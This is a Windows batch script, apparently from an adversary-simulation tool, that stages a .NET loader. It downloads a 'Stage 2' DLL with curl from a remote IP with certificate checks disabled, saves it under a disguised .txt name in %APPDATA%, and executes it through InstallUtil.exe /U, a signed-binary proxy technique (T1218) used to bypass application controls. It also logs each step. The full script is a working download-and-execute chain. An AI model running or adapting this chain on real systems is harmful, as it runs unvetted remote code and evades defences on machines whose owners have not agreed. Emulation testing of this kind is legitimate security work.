@echo off
setlocal enabledelayedexpansion

REM random variable assignments for PHR placeholders
set xqwert=https://10.0.0.49/stage/2/icon.png?10358-7
set yuiop=%APPDATA%\10358\fae0dccd
set asdfg=423c47cc.txt
set hjklz=%APPDATA%\7
set bnmcv=%APPDATA%\7\macula-simulations.log
set zxcvb=ITZEL-S2B
set lkjhg=10358
set mnbvc=7

REM cache timestamp once
set tsvar=!DATE!/!TIME!

REM determine log file path using endpoint ID
set logfilepath=%APPDATA%\!mnbvc!\macula-simulations.log

REM create log directory if missing
if not exist "%APPDATA%\!mnbvc!" mkdir "%APPDATA%\!mnbvc!" 2>nul

REM debug: heartbeat start
echo [!tsvar!][DEBUG][!zxcvb!][!lkjhg!]: heartbeat_start>> "!logfilepath!" 2>nul

REM Stage 2 download – single heartbeat fetch saving Loader DLL to disk
curl -k -s -o "!yuiop!\!asdfg!" "!xqwert!"
set curl_exitcode=!errorlevel!
echo [!tsvar!][DEBUG][!zxcvb!][!lkjhg!]: heartbeat_complete=!curl_exitcode!>> "!logfilepath!" 2>nul

REM debug: directory change start
echo [!tsvar!][DEBUG][!zxcvb!][!lkjhg!]: chdir_start>> "!logfilepath!" 2>nul
cd /d "!yuiop!"
set cd_exitcode=!errorlevel!
echo [!tsvar!][DEBUG][!zxcvb!][!lkjhg!]: chdir_result=!cd_exitcode!>> "!logfilepath!" 2>nul

REM debug: LOLBIN invocation
echo [!tsvar!][DEBUG][!zxcvb!][!lkjhg!]: installutil_start>> "!logfilepath!" 2>nul

REM Invoke the .NET loader DLL via InstallUtil /U (triggers Uninstall method)
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "!asdfg!" >NUL 2>&1
set lolbin_exitcode=!errorlevel!
echo [!tsvar!][DEBUG][!zxcvb!][!lkjhg!]: installutil_result=!lolbin_exitcode!>> "!logfilepath!" 2>nul

REM TTP execution log line
if !lolbin_exitcode! equ 0 (
    echo [!tsvar!][TTP][!zxcvb!][!lkjhg!]: T1218|System Binary Proxy Execution=[OK]:[]>> "!logfilepath!" 2>nul
) else (
    echo [!tsvar!][TTP][!zxcvb!][!lkjhg!]: T1218|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed]>> "!logfilepath!" 2>nul
)

exit /b 0